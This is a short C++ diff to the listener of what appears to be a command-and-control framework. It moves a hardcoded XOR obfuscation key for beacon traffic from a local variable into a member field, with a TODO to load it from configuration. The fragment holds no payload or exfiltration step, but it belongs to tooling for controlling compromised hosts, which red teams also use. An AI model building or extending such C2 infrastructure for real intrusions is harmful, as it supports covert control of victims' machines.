@@ -47,7 +47,8 @@ Listener::Listener(const std::string& param1, const std::string& param2, const s
 		m_hostname = infoBuf;
 
 #endif
-
+	// TODO put as a param comming from conf
+	m_key="dfsdgferhzdzxczevre5595485sdg";
 
 }
 
@@ -288,9 +289,8 @@ C2Message Listener::getTaskResult(std::string& beaconHash)
 // output is the message send by listener to the beacon
 bool Listener::handleMessages(const std::string& input, std::string& output)
 {
-	std::string key="dfsdgferhzdzxczevre5595485sdg";
 	std::string data = base64_decode(input);
-	XOR(data, key);
+	XOR(data, m_key);
 
 	// Mutli Session, Multi message 
 	MultiBundleC2Message multiBundleC2Message;
@@ -476,7 +476,7 @@ bool Listener::handleMessages(const std::string& input, std::string& output)
 	if (data.empty())
 		data = "{}";
 
-	XOR(data, key);
+	XOR(data, m_key);
 	output = base64_encode(data);
 
 	return isTaskToSend;
